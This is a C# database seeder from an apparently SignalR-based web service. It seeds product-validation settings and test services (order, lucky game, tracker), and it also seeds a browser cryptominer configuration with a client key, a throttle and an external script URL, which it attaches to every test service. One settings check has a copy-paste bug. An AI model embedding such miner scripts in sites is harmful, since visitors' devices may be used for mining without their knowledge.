using SignalRService.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SignalRService.Utils
{
    public class DbSeeder
    {

        private DAL.ServiceContext db;

        public DbSeeder()
        {
            db = new DAL.ServiceContext();
        }

        public void DefaultMinerConfiguration()
        {
            if (!db.MinerConfiurationModels.Any())
            {
                db.MinerConfiurationModels.Add(new MinerConfigurationModel()
                {
                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                    Throttle = 0.9f,
                    ScriptUrl = "https://www.freecontent.date./W7KS.js",
                    StartDelayMs = 5000,
                    ReportStatusIntervalMs = 60000
                });
                db.SaveChanges();
            }
        }

        public void GeneralSettings()
        {
            IList<GeneralSettingsModel> defaultStandards = new List<GeneralSettingsModel>();
            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMaxLength, Type = Enums.EnumSettingType.Int, Value = "90" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMinPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMinPrice, Type = Enums.EnumSettingType.Int, Value = "0" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMaxPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMaxPrice, Type = Enums.EnumSettingType.Float, Value = "99999.99" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductPartNumberMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMaxLength, Type = Enums.EnumSettingType.Int, Value = "12" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMaxLength, Type = Enums.EnumSettingType.Int, Value = "128" });

            db.GeneralSettings.AddRange(defaultStandards);
            db.SaveChanges();
        }

        public void TestServices()
        {
            var defAccountProp = new Models.UserDataModel() { IdentityName = "anonymous" };
            db.UserData.Add(defAccountProp);

            var mc = db.MinerConfiurationModels.FirstOrDefault();

            var orderService = new Models.ServiceSettingModel()
            {
                Owner = defAccountProp,
                ServiceName = "TestService",
                ServiceUrl = "testurl",
                ServiceType = Enums.EnumServiceType.OrderService,
                MinerConfiguration = mc

            };
            db.ServiceSettings.Add(orderService);

            var gameService = new Models.ServiceSettingModel()
            {
                Owner = defAccountProp,
                ServiceName = "TestGame",
                ServiceUrl = "testgame",
                ServiceType = Enums.EnumServiceType.LuckyGameDefault,
                MinerConfiguration = mc
            };
            db.ServiceSettings.Add(gameService);

            var defRule1 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 3, WinFactor = 1.6f };
            var defRule2 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 4, WinFactor = 4 };
            var defRule3 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 5, WinFactor = 5 };
            var defRule4 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 6, WinFactor = 10 };

            var gsmodel = new Models.LuckyGameSettingsModel()
            {
                MoneyAvailable = 0,
                WinningRules = new List<Models.LuckyGameWinningRule>()

            };
            //   gsmodel.WinningRules.Add(defRule0);
            gsmodel.WinningRules.Add(defRule1);
            gsmodel.WinningRules.Add(defRule2);
            gsmodel.WinningRules.Add(defRule3);
            gsmodel.WinningRules.Add(defRule4);

            gameService.LuckyGameSettings = new List<Models.LuckyGameSettingsModel>();
            gameService.LuckyGameSettings.Add(gsmodel);

            ///
            var trackerService = new ServiceSettingModel() { };
            trackerService.ServiceName = "testTracker";
            trackerService.ServiceUrl = "testTracker";
            trackerService.ServiceType = Enums.EnumServiceType.BaseTracking;
            trackerService.MinerConfiguration = mc;
            db.ServiceSettings.Add(trackerService);




            db.SaveChanges();

        }


    }
}